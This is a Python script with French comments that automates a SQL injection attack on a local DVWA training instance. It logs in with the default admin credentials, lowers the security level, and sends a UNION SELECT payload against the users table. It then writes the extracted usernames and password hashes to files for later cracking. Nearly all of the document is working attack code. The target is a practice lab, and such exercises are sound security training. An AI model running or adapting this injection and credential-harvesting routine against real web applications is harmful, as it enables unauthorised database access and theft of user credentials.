#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

# URLs
base_url = "http://localhost/dvwa/"
login_url = base_url + "login.php"
sqli_url = base_url + "vulnerabilities/sqli"
security_url = base_url + "security.php"

# Création de session
session = requests.Session()

# 1. Récupérer le token CSRF depuis login.php
login_page = session.get(login_url)
soup = BeautifulSoup(login_page.text, "html.parser")
token = soup.find("input", {"name": "user_token"})["value"]

# 2. Connexion
login_data = {
	"username": "admin",
	"password": "password",
	"Login": "Login",
	"user_token": token
}
login_response = session.post(login_url, data=login_data)
#print(login_response.text)
if "Login failed" in login_response.text:
	print("[!] Échec de connexion.")
	exit()

print("[+] Connexion réussie.")
sec_page = session.get(security_url)
soup = BeautifulSoup(sec_page.text, "html.parser")
token = soup.find("input", {"name": "user_token"})["value"]
session.post(security_url, data={"security": "low", "seclev_submit": "Submit", "user_token": token})


# 4. Tester les payloads SQLi
payload ="1' UNION select user,password from dvwa.users -- "

params = {"id": payload, "Submit": "Submit"}
response = session.get(sqli_url, params=params)
soup=BeautifulSoup(response.text, "html.parser")
vuln_code= soup.find("div", {"class": "vulnerable_code_area"})
pre_tag=vuln_code.find_all('pre')
global_lines=[]
for pre in pre_tag:
   text=pre.get_text(separator="|")
   lines=[line.strip() for line in text.split("|") if line.strip()]
   global_lines.extend(lines)
#print(global_lines)
# Prepare output files
with open("users_and_hashes.txt", "w") as f_users, open("hashes.txt", "w") as f_hashes:
	username = None

	for line in global_lines:
    	if "First name:" in line:
        	username = line.replace("First name:", "").strip()

    	if "Surname:" in line:
        	password_hash = line.replace("Surname:", "").strip()
       	 
        	# Save Username and Password Hash
        	f_users.write(f"{username}:{password_hash}\n")
       	 
        	# Save only hash
        	f_hashes.write(f"{password_hash}\n")


